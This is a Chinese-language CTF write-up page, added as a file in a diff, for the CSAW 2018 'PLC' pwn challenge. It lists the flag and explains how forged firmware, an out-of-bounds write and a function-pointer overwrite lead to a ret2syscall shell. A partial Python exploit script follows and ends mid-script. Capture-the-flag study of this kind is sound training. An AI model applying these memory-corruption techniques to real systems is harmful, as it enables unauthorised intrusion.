@@ -1,0 +1,1057 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="DF Team CTF writeups">
+      
+      
+        <link rel="canonical" href="https://A30lu5.github.io/blogs/CSAW-CTF-2018-Quals/pwn/plc/writeup/">
+      
+      
+        <meta name="author" content="DF Team">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../..">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.4">
+    
+    
+      
+        <title>PLC | ret2syscall - DF Team</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#7cb342">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
+    
+      <link rel="stylesheet" href="../../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="light-green" data-md-color-accent="light-green">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="../../../../#plc" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://A30lu5.github.io/blogs/" title="DF Team" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                DF Team
+              </span>
+              <span class="md-header-nav__topic">
+                PLC | ret2syscall
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/A30lu5/blogs/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      A30lu5/blogs
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../.." title="Introduction" class="md-tabs__link md-tabs__link--active">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://A30lu5.github.io/blogs/" title="DF Team" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    DF Team
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/A30lu5/blogs/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      A30lu5/blogs
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="Getting Started" class="md-nav__link">
+      Getting Started
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2">
+    
+    <label class="md-nav__link" for="nav-1-2">
+      noxCTF2018
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        noxCTF2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2-1" type="checkbox" id="nav-1-2-1">
+    
+    <label class="md-nav__link" for="nav-1-2-1">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-1">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/believeMe/writeup/" title="believe Me" class="md-nav__link">
+      believe Me
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/TheNameCalculator/writeup/" title="The Name Calculator" class="md-nav__link">
+      The Name Calculator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/GroceryList/writeup/" title="Grocery List" class="md-nav__link">
+      Grocery List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/TheBlackCanary/writeup/" title="The Black Canary" class="md-nav__link">
+      The Black Canary
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2-2" type="checkbox" id="nav-1-2-2">
+    
+    <label class="md-nav__link" for="nav-1-2-2">
+      reverse
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-2">
+        reverse
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/reverse/GuessTheString/writeup/" title="GuessTheString" class="md-nav__link">
+      GuessTheString
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/reverse/Att3nti0n/writeup/" title="Att3nti0n" class="md-nav__link">
+      Att3nti0n
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/reverse/avatar/writeup/" title="avatar" class="md-nav__link">
+      avatar
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2-3" type="checkbox" id="nav-1-2-3">
+    
+    <label class="md-nav__link" for="nav-1-2-3">
+      web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-3">
+        web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/web/Reference/writeup/" title="Reference" class="md-nav__link">
+      Reference
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/web/MyFileUploader/writeup/" title="MyFileUploader" class="md-nav__link">
+      MyFileUploader
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/web/hiddenDOM/writeup/" title="hiddenDOM" class="md-nav__link">
+      hiddenDOM
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3" checked>
+    
+    <label class="md-nav__link" for="nav-1-3">
+      CSAW-CTF-2018-Quals
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        CSAW-CTF-2018-Quals
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-3-1" type="checkbox" id="nav-1-3-1" checked>
+    
+    <label class="md-nav__link" for="nav-1-3-1">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-3-1">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../bigboy/writeup/" title="bigboy | 简单栈溢出" class="md-nav__link">
+      bigboy | 简单栈溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../get_it/writeup/" title="get it | 简单栈溢出" class="md-nav__link">
+      get it | 简单栈溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../shellpointcode/writeup/" title="shellpointcode | 13字节的shellcode" class="md-nav__link">
+      shellpointcode | 13字节的shellcode
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../doubletrouble/writeup/" title="doubletrouble | 双精度浮点排序" class="md-nav__link">
+      doubletrouble | 双精度浮点排序
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../turtles/writeup/" title="turtles | objc对象构造" class="md-nav__link">
+      turtles | objc对象构造
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        PLC | ret2syscall
+      </label>
+    
+    <a href="./" title="PLC | ret2syscall" class="md-nav__link md-nav__link--active">
+      PLC | ret2syscall
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" title="Description" class="md-nav__link">
+    Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" title="solution" class="md-nav__link">
+    solution
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../alien_invasion/writeup/" title="Alien Invasion | 数据越界" class="md-nav__link">
+      Alien Invasion | 数据越界
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" title="Description" class="md-nav__link">
+    Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" title="solution" class="md-nav__link">
+    solution
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/A30lu5/blogs/blob/master/docs/CSAW-CTF-2018-Quals/pwn/plc/writeup.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="plc">PLC<a class="headerlink" href="#plc" title="Permanent link">&para;</a></h1>
+<p>Points: 300</p>
+<p>Flag: <code>flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}</code></p>
+<h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges.
+Kinetic damage is necessary, we need you to neutralize these machines.</p>
+<p>You can access this challenge at <a href="https://wargames.ret2.systems/csaw_2018_plc_challenge">https://wargames.ret2.systems/csaw_2018_plc_challenge</a></p>
+<p><em>NOTE</em> The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at <code>contact at ret2.io</code></p>
+</blockquote>
+<h2 id="solution">solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
+<ol>
+<li>只可以利用wargame平台进行做题，但平台已经提供了反汇编器、main函数的源码、python代码编辑器、gdb调试器。</li>
+<li>功能比较简单，按平台步骤提示往下走：<ol>
+<li>先分析checksum验证函数，构造能顺序通过checksum检查的固件</li>
+<li>分析xexecutefirmware函数，发现<code>0x37</code>可以控制离心机转速，通过多个<code>0x37</code>指令，使得离心机转速超标。</li>
+<li>发现<code>0x32</code>,可以控制0x32后面一位覆盖核反应堆材料的内存地方，因此会有内存越界写的现象</li>
+<li>调试发现，核反应堆材料的内存地方后面有两个函数指针，因此，可以通过改写函数指针，从而达到<code>call　anycode</code>的目的</li>
+<li>调试再发现，在main函数中，有个128字节大小的缓冲区，可以存放ret2syscall的gadget（因为程序disable了libc的system，他的实现方法是改写了execve开头的指令，使其执行abort函数）</li>
+<li>可以通过多次pop　ret,　退到ret2syscall的缓冲区地方，从而顺利拿到shell。</li>
+</ol>
+</li>
+</ol>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">interact</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+
+<span class="k">def</span> <span class="nf">p16</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;H&quot;</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">p64</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">u64</span><span class="p">(</span><span class="n">sstr</span><span class="p">):</span>
+    <span class="n">res</span><span class="p">,</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">sstr</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+
+<span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">sstr</span><span class="p">):</span>
+    <span class="n">res</span><span class="p">,</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;H&quot;</span><span class="p">,</span> <span class="n">sstr</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">interact</span><span class="o">.</span><span class="n">Process</span><span class="p">()</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="c1">#p.sendline(&quot;S&quot;)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;U&quot;</span><span class="p">)</span>
+<span class="c1">#data = p.readuntil(&#39;\n&#39;)</span>
+
+<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x45390</span>
+<span class="n">abort_offset</span> <span class="o">=</span> <span class="mh">0x36ec0</span>
+
+<span class="n">one_gg</span> <span class="o">=</span> <span class="mh">0x45216</span>
+<span class="c1">#one_gg = 0xec0</span>
+<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;</span><span class="se">\x36</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x37</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="mi">68</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="s2">&quot;</span><span class="se">\x32</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="mi">68</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;F&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;W&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;9&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;9&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">validate_checksum</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
+    <span class="n">checksum</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">):</span>
+        <span class="n">checksum</span> <span class="o">=</span> <span class="p">((((((</span><span class="n">checksum</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">checksum</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+                     <span class="o">^</span> <span class="p">(</span><span class="n">u16</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]))))</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span>
+    <span class="k">return</span> <span class="n">checksum</span>
+
+
+<span class="n">checkss</span> <span class="o">=</span> <span class="n">validate_checksum</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="n">checkss</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="n">checkss</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">#p.sendline(&#39;FW&#39;+&quot;1&quot;*0x400)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;E&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;S&quot;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;ENRICHMENT MATERIAL: &quot;</span><span class="o">+</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">68</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">data</span><span class="p">,</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="c1"># print &quot;llllllllllllllllll: &quot;, hex(data)</span>
+<span class="n">bin_base</span> <span class="o">=</span> <span class="n">data</span> <span class="o">-</span> <span class="mh">0xab0</span>
+<span class="k">print</span> <span class="s2">&quot;bin base: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_base</span><span class="p">)</span>
+
+<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;</span><span class="se">\x36</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x37</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="mi">76</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="s2">&quot;</span><span class="se">\x32</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="mi">76</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;F&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;W&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;9&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;9&quot;</span>
+<span class="n">checkss</span> <span class="o">=</span> <span class="n">validate_checksum</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="n">checkss</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="n">checkss</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;U&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;E&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;S&quot;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;ENRICHMENT MATERIAL: &quot;</span><span class="o">+</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">76</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
